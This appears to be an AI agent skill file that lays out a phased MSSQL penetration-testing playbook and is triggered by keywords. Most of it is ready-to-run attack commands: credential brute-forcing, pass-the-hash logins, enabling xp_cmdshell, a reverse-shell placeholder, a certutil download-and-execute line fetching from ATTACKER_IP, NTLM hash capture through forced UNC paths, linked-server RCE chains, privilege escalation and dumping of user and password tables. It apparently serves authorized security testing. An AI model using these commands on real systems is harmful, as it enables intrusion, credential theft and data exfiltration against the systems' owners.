---
name: proto-mssql
description: "Microsoft SQL Server (MSSQL) penetration testing. Authentication, enumeration, xp_cmdshell RCE, linked server abuse, privilege escalation, database enumeration, UNC path capture, OPSEC considerations. Triggers: 'mssql', 'sql server', 'mssql pentest', 'xp_cmdshell', 'mssql rce', 'mssql enumeration', 'sql server pentest', 'mssql credential', 'linked server', 'mssql xp_cmdshell'."
---

# MSSQL Penetration Testing

Auth → enumerate → xp_cmdshell → linked servers → privilege escalation → lateral.

## Install

```bash
pip install impacket --break-system-packages
apt-get install -y mssql-tools freetds-bin

# mssqlclient.py (impacket):
impacket-mssqlclient --help

# sqsh (interactive):
apt-get install -y sqsh
```

---

## Phase 1: Discovery & Authentication

```bash
TARGET_IP="192.168.1.100"
PORT=1433

# Port scan:
nmap -sV -p 1433 $TARGET_IP
nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET_IP

# Enumerate SQL Server instances:
nmap -p 1434 --script ms-sql-discover,ms-sql-dac $TARGET_IP

# Connect with Windows auth (pass-the-hash):
impacket-mssqlclient DOMAIN/Username:Password@$TARGET_IP -windows-auth

# SQL auth (SA account):
impacket-mssqlclient sa:password@$TARGET_IP

# Pass-the-hash:
impacket-mssqlclient -hashes :NTLM_HASH DOMAIN/Administrator@$TARGET_IP -windows-auth

# Brute force (common creds):
USERS=("sa" "admin" "mssql" "sql")
PASSES=("sa" "password" "Password1" "admin" "")
for user in "${USERS[@]}"; do
  for pass in "${PASSES[@]}"; do
    echo "Trying $user:$pass"
    timeout 3 impacket-mssqlclient $user:$pass@$TARGET_IP 2>/dev/null && echo "SUCCESS: $user:$pass" && break 2
  done
done
```

---

## Phase 2: Enumeration

```sql
-- Current user and privileges:
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');

-- All databases:
SELECT name, database_id FROM sys.databases;

-- Current database:
SELECT DB_NAME();

-- Tables in current database:
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- All logins:
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');

-- sysadmin members:
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Server version:
SELECT @@VERSION;

-- Linked servers:
SELECT srv.name, srv.product, srv.provider FROM sys.servers srv WHERE is_linked = 1;

-- Check if xp_cmdshell is enabled:
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
```

---

## Phase 3: Enable & Use xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin):
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';

-- Read files:
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- Reverse shell:
EXEC xp_cmdshell 'powershell -enc BASE64_ENCODED_PAYLOAD';

-- Download + execute:
EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe';

-- Disable xp_cmdshell (cleanup):
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

---

## Phase 4: UNC Path Capture (NTLM Hash Stealing)

```sql
-- Force MSSQL to authenticate to attacker's SMB share
-- Captures NTLMv2 hash via Responder

-- Start Responder:
-- sudo responder -I eth0 -wrf

-- Trigger UNC:
EXEC master..xp_subdirs '\\ATTACKER_IP\share';
EXEC master..xp_fileexist '\\ATTACKER_IP\share\test';
-- OR:
EXEC xp_cmdshell 'dir \\ATTACKER_IP\share';

-- Crack captured hash with hashcat:
-- hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

---

## Phase 5: Linked Server Abuse

```sql
-- Enumerate linked servers:
SELECT srv.name, srv.product, srv.provider, srv.data_source
FROM sys.servers srv WHERE is_linked = 1;

-- Execute on linked server:
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@VERSION');
EXEC ('SELECT @@VERSION') AT [LINKED_SERVER];

-- RCE via linked server if it has xp_cmdshell:
EXEC ('EXEC master..xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Chain multiple linked servers:
EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT [SECOND_SERVER]') AT [LINKED_SERVER];
```

---

## Phase 6: Privilege Escalation

```sql
-- Check impersonation rights:
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sysadmin:
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Should be 1

-- Via OPENROWSET (OLE DB):
EXEC('select 1') AT [LINKED_SERVER];

-- Database ownership chaining:
CREATE DATABASE owned_db;
USE owned_db;
CREATE PROCEDURE dbo.sp_escalate WITH EXECUTE AS OWNER AS
  EXEC master..xp_cmdshell 'whoami';
EXEC sp_escalate;
```

---

## Phase 7: Data Extraction

```sql
-- Dump all tables:
USE target_database;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

-- Dump users/passwords:
SELECT TOP 100 username, password, email FROM dbo.users;

-- Search for sensitive columns:
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%'
   OR COLUMN_NAME LIKE '%pass%'
   OR COLUMN_NAME LIKE '%secret%'
   OR COLUMN_NAME LIKE '%key%'
   OR COLUMN_NAME LIKE '%token%';

-- Export to file:
EXEC xp_cmdshell 'bcp "SELECT * FROM target_db..users" queryout C:\Windows\Temp\users.csv -c -t "," -S localhost -T';
```

---

## Output

Save to `.omop/engagement/proto/mssql/`:
- `enum.txt` — databases, users, server info
- `xp_cmdshell.txt` — command execution evidence
- `data-extract.csv` — extracted data
- `linked-servers.txt` — linked server abuse chain

## Next Phase

→ `post-credential-dumping` for Windows creds from shell
→ `ad-attacks` for Active Directory escalation
